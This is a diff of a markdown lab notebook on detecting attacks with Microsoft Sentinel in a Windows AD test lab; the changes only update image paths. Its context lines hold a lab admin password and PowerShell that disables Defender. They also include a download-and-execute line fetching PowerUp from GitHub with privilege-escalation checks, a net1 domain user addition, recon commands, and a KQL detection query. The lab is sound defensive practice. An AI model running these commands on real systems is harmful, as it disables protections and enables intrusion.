@@ -23,9 +23,9 @@ Use below parameters to connect:
 | Username | doazlab\DOAdmin |
 | Password | DOLabAdmin1!    |
 
-- ![](IMG-20231117223945342.png)
-- ![](IMG-20231117224002264.png)
-- ![](IMG-20231117224017961.png)
+- ![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231117223945342.png)
+- ![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231117224002264.png)
+- ![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231117224017961.png)
 # Turn Off Defender/AV - for testing
 By default, this lab has Defender operational and common malicious activity will be blocked.. For these next steps, lets first disable Defender:
 ```powershell
@@ -33,7 +33,7 @@ Set-MpPreference -ExclusionPath 'c:\users\doadmin'
 Set-MpPreference -ExclusionProcess "powershell.exe", "cmd.exe"
 Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
 ```
-- ![](IMG-20231117224906772.png)
+- ![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231117224906772.png)
 # Generate Suspicious Events with PowerUp
 - First we will import a known attack tool "PowerUp". We will later ensure that Sentinel captured the Powershell invocations.
 ```powershell
@@ -41,7 +41,7 @@ Set-ExecutionPolicy bypass -force
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1') 
 invoke-allchecks
 ```
-- ![](IMG-20231117225041789.png) 
+- ![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231117225041789.png) 
 - Output
 ```
 PS C:\Users\doadmin> Set-ExecutionPolicy bypass -force
@@ -112,7 +112,7 @@ UnattendPath : C:\Windows\Panther\Unattend.xml
 ```powershell
 net1 user appliedDemo apTclass! /add /domain 
 ```
-- ![](IMG-20231117225446553.png)
+- ![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231117225446553.png)
 
 # Domain Reconnaissance
 - Recon activity is common with adversaries especially since they don't understand the environment like defenders typically do
@@ -122,7 +122,7 @@ We can utilize some native PS components to gain an understanding of the domain
 [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
 ```
 
-![](IMG-20231117225817755.png)
+![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231117225817755.png)
 
 # Host Recon
 - LOL = living of the land
@@ -136,38 +136,38 @@ Invoke-HostRecon
 |Out-File recon.txt 
 ```
 
-![](IMG-20231117230353006.png)
+![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231117230353006.png)
 
 Results:
-- ![](IMG-20231117230456273.png)
-- ![](IMG-20231117230514241.png)
+- ![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231117230456273.png)
+- ![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231117230514241.png)
 # First Look at Azure Sentinel
 - Access the Azure Portal at Link: [https://portal.azure.com](https://portal.azure.com/).
 - After login, Search "Sentinel" (2) and click on "Microsoft Sentinel" (3)
-![](IMG-20231117230830662.png)
-![](IMG-20231117230847678.png)
+![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231117230830662.png)
+![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231117230847678.png)
 
 - No logs showing up in current Sentinel workspace? Switch to old overview
-	- ![](IMG-20231118134321536.png)
-	- ![](IMG-20231118134249419.png)
+	- ![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231118134321536.png)
+	- ![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231118134249419.png)
 	- Switch to the old overview
-		- ![](IMG-20231118192233137.png)
-		- ![](IMG-20231118134546595.png)
+		- ![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231118192233137.png)
+		- ![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231118134546595.png)
 
 - If no logs show up
 	- Navigate to portal.azure.com > Log Analytics Workspace > Virtual Machines and make sure they are connected to the workspace. If they do not show connected, do so now. Logs will start flowing promptly.
 	- Says not connected, but only in deprecated feature?
-		- ![](IMG-20231118192527785.png)
+		- ![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231118192527785.png)
 	- Shows as connected in "Agents"
 		- #DO-TODO
-		- ![](IMG-20231118192651277.png)
-		- ![](IMG-20231118192942726.png)
+		- ![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231118192651277.png)
+		- ![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231118192942726.png)
 	- Connecting them anyway
-		- ![](IMG-20231118192748083.png)
+		- ![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231118192748083.png)
 # First KQL Analytics Query
 
 - Azure > Sentinel > Logs
-	- ![](IMG-20231118193648396.png)
+	- ![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231118193648396.png)
 - Query for detecting the following events
 	- [4688](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688): A new process has been created
 	- 4103
@@ -180,10 +180,10 @@ union Event, SecurityEvent
 | where EventData contains "iex" or EventData contains "invoke" or EventData contains "import" or EventData contains "bypass" or EventData contains "git*" 
 ```
 - Results
-	- ![](IMG-20231118195046657.png)
+	- ![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231118195046657.png)
 # KQL Query Result & GUI
 - Lots of changes with Entra ID that also can affect Sentinel and KQL queries
-	- ![](IMG-20231118195659066.png)
+	- ![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231118195659066.png)
 - Below query didn't actually return any results
 ```
 union Event, SecurityEvent 
@@ -195,4 +195,4 @@ union Event, SecurityEvent
 - I even tried running the suspicious activity in the workstation again
 
 - [May 2023 - Difference between Log Analytics and Monitor - Microsoft Community Hub](https://techcommunity.microsoft.com/t5/azure-observability/difference-between-log-analytics-and-monitor/m-p/1290086)
-	- ![](IMG-20231118201916533.png)
+	- ![](../../__attachments/Honey%20Accounts%20in%20Windows%20AD/Project%20Workspace/IMG-20231118201916533.png)
